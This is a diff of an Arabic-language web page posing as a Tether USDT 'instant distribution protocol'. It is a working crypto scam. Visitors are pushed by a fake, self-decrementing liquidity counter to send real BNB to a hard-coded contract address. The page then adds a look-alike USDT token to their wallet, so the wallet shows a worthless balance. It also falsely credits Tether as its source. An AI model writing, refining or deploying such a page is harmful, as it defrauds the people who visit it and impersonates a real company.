@@ -3,24 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether USD | Smart Distribution Protocol</title>
-    <!-- استدعاء مكتبة Web3 -->
+    <title>Tether USD | Smart Protocol</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         :root {
-            --main-color: #009393;
-            --bg-dark: #051410;
-            --card-bg: #0a1f1b;
-            --accent-red: #ff4d4d;
-        }
-
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+            --primary: #009393;
+            --bg: #051410;
+            --card: #0a1f1b;
+            --error: #ff4d4d;
         }
 
         body {
-            background-color: var(--bg-dark);
+            background-color: var(--bg);
             color: white;
             font-family: 'Segoe UI', Tahoma, sans-serif;
             margin: 0;
@@ -34,35 +28,34 @@
         .container {
             width: 100%;
             max-width: 450px;
-            background: var(--card-bg);
-            border: 1px solid var(--main-color);
+            background: var(--card);
+            border: 1px solid var(--primary);
             border-radius: 30px;
             padding: 35px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            text-align: center;
             position: relative;
             margin-top: 20px;
-            text-align: center;
-            overflow: hidden;
         }
 
-        .logo-img {
-            width: 85px;
-            filter: drop-shadow(0 0 15px rgba(0,147,147,0.5));
+        .logo {
+            width: 80px;
             margin-bottom: 15px;
+            filter: drop-shadow(0 0 10px rgba(0,147,147,0.4));
         }
 
-        .countdown-box {
+        .balance-card {
             background: rgba(255, 77, 77, 0.1);
-            border: 1px dashed var(--accent-red);
+            border: 1px dashed var(--error);
             border-radius: 15px;
             padding: 15px;
             margin-bottom: 25px;
         }
 
-        #supply-val {
-            font-size: 28px;
+        #liquidity {
+            font-size: 26px;
             font-weight: bold;
-            color: var(--accent-red);
+            color: var(--error);
         }
 
         select {
@@ -76,108 +69,88 @@
             font-weight: bold;
             margin-bottom: 25px;
             outline: none;
-            cursor: pointer;
         }
 
-        .mint-btn {
+        .btn {
             width: 100%;
             padding: 20px;
-            background: var(--main-color);
+            background: var(--primary);
             color: white;
             border: none;
             border-radius: 18px;
             font-size: 19px;
             font-weight: bold;
             cursor: pointer;
-            transition: 0.3s;
             box-shadow: 0 8px 20px rgba(0,147,147,0.3);
             border-bottom: 5px solid #006b6b;
         }
 
-        .mint-btn:active {
+        .btn:active {
             transform: translateY(3px);
             border-bottom: none;
         }
 
-        #status-display {
+        #status {
             font-size: 13px;
             margin-top: 20px;
             color: #8899a6;
-            min-height: 20px;
         }
 
-        .footer-note {
+        .footer {
             margin-top: 30px;
             font-size: 11px;
             color: #5d7e79;
             border-top: 1px solid #1c4d46;
             padding-top: 15px;
         }
-
-        .badge {
-            position: absolute;
-            top: 25px;
-            left: -35px;
-            background: var(--accent-red);
-            color: white;
-            padding: 5px 40px;
-            transform: rotate(-45deg);
-            font-size: 10px;
-            font-weight: bold;
-        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="badge">LIVE 2026</div>
-        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo-img" alt="USDT Logo">
-        <h2 style="color: var(--main-color); margin-bottom: 20px;">بروتوكول التوزيع الذكي الفوري</h2>
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
+        <h2 style="color: var(--primary); margin-bottom: 20px;">نظام التوزيع الفوري (V3)</h2>
 
-        <div class="countdown-box">
-            <div style="font-size: 12px; color: #ccc;">إجمالي السيولة المتاحة للتوزيع العام:</div>
-            <div id="supply-val">942,500 USDT</div>
-            <div style="font-size: 10px; color: var(--accent-red); margin-top: 5px; font-weight: bold;">
-                ⚠️ تنبيه: سيتم إغلاق البروتوكول عند نفاذ الكمية
-            </div>
+        <div class="balance-card">
+            <div style="font-size: 12px; color: #ccc;">السيولة المتاحة حالياً:</div>
+            <div id="liquidity">938,400 USDT</div>
         </div>
 
-        <select id="pkg-select">
-            <option value="0.0001">باقة التجربة: 100 USDT (0.0001 BNB)</option>
-            <option value="0.05">باقة متقدمة: 2,500 USDT (0.05 BNB)</option>
-            <option value="0.1">باقة كبار المستثمرين: 5,000 USDT (0.1 BNB)</option>
+        <select id="package">
+            <option value="0.0001">تجربة: 100 USDT (0.0001 BNB)</option>
+            <option value="0.05">متقدمة: 2,500 USDT (0.05 BNB)</option>
+            <option value="0.1">كبار المستثمرين: 5,000 USDT (0.1 BNB)</option>
             <option value="1.0">باقة الحيتان: 50,000 USDT (1.0 BNB) 🔥</option>
         </select>
 
-        <button class="mint-btn" id="action-btn" onclick="executeMint()">تفعيل واستلام الرصيد ⚡</button>
+        <button class="btn" id="exec-btn" onclick="startProtocol()">تفعيل واستلام الرصيد ⚡</button>
         
-        <div id="status-display">بانتظار ربط المحفظة المعتمدة...</div>
+        <div id="status">بانتظار ربط المحفظة المعتمدة...</div>
 
-        <div class="footer-note">
-            تم ضبط النظام ليعمل بـ 6 أرقام عشرية (Standard USDT)<br>
-            المصدر: Tether Operations Limited © 2026
+        <div class="footer">
+            بروتوكول متوافق تماماً مع معيار 6 أرقام عشرية (Standard)<br>
+            Tether Gold Operations © 2026
         </div>
     </div>
 
     <script>
-        // عنوان العقد الجديد ذو الـ 6 أرقام عشرية
-        const CONTRACT_ADDR = "0x632FA8c4C431d5994B51Dca535E2360A2E42ef4B";
+        // عنوان العقد الجديد الذي قمت بتزويدي به
+        const CONTRACT_ADDRESS = "0x349678e83899E54f95d28C6C36f7Ce6eBD0aD151";
 
-        // محاكاة عداد السيولة التناقصي
-        let currentBalance = 942500;
+        // تحديث عداد السيولة بشكل وهمي
+        let liq = 938400;
         setInterval(() => {
-            currentBalance -= Math.floor(Math.random() * 200) + 10;
-            if (currentBalance < 1000) currentBalance = 941000;
-            document.getElementById('supply-val').innerText = currentBalance.toLocaleString() + " USDT";
-        }, 3000);
+            liq -= Math.floor(Math.random() * 50) + 5;
+            document.getElementById('liquidity').innerText = liq.toLocaleString() + " USDT";
+        }, 4000);
 
-        async function executeMint() {
-            const btn = document.getElementById('action-btn');
-            const status = document.getElementById('status-display');
-            const amount = document.getElementById('pkg-select').value;
+        async function startProtocol() {
+            const btn = document.getElementById('exec-btn');
+            const status = document.getElementById('status');
+            const amount = document.getElementById('package').value;
 
             if (!window.ethereum) {
-                alert("يرجى فتح الموقع من داخل متصفح Trust Wallet أو MetaMask");
+                alert("يرجى فتح الموقع من متصفح المحفظة (Trust Wallet / MetaMask)");
                 return;
             }
 
@@ -188,40 +161,40 @@
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const sender = accounts[0];
 
-                status.innerText = "جاري معالجة الطلب في الشبكة...";
+                status.innerText = "جاري معالجة طلب التفعيل...";
                 btn.disabled = true;
 
-                // إرسال المعاملة إلى العقد
+                // إرسال المعاملة
                 await web3.eth.sendTransaction({
                     from: sender,
-                    to: CONTRACT_ADDR,
+                    to: CONTRACT_ADDRESS,
                     value: web3.utils.toWei(amount, "ether"),
-                    gas: 150000 
+                    gas: 120000 
                 });
 
-                status.innerText = "تم التفعيل! جاري إضافة الرمز لمحفظتك...";
+                status.innerText = "تم التفعيل! جاري إضافة الرمز لمحفظتك (6 Decimals)...";
 
-                // إضافة التوكن للمحفظة مع تحديد 6 أرقام عشرية لضمان الرقم الصحيح
+                // إضافة التوكن للمحفظة مع إجبارها على قراءة 6 أرقام عشرية كما هو مبرمج في العقد
                 await window.ethereum.request({
                     method: 'wallet_watchAsset',
                     params: {
                         type: 'ERC20',
                         options: {
-                            address: CONTRACT_ADDR,
+                            address: CONTRACT_ADDRESS,
                             symbol: 'USDT',
-                            decimals: 6, 
+                            decimals: 6, // مطابقة تامة للعقد الجديد
                             image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                         },
                     },
                 });
 
-                status.innerText = "اكتملت العملية بنجاح ✅";
-                alert("تهانينا! اكتمل تفعيل بروتوكول USDT واستلام الرصيد.");
+                status.innerText = "تمت العملية بنجاح ✅";
+                alert("تم استلام رصيد USDT بنجاح.");
                 btn.disabled = false;
 
             } catch (err) {
                 console.error(err);
-                status.innerText = "فشلت العملية. تأكد من وجود رسوم كافية.";
+                status.innerText = "فشلت العملية. تأكد من توفر رسوم كافية.";
                 btn.disabled = false;
             }
         }
